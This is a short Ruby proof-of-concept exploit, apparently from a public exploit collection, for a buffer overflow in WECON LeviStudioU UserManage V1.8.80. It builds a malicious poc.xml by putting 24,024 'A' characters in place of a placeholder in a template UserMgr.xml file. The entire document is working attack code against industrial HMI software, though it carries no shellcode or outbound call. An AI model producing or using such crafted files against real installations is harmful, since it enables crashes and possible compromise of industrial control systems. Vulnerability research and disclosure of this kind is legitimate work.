#!/usr/bin/env ruby
# WECON LeviStudioU UserManage（2019-09-21）Release Build 2019-09-21 V1.8.80 Buffer Overflow
require 'rex'

fd = File.open("UserMgr.xml", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

data = "A" * 24024 

fuzz = new_eve

x = File.new("poc.xml","wb")
x.write(fuzz.gsub(/FUZZER/, data))
x.close
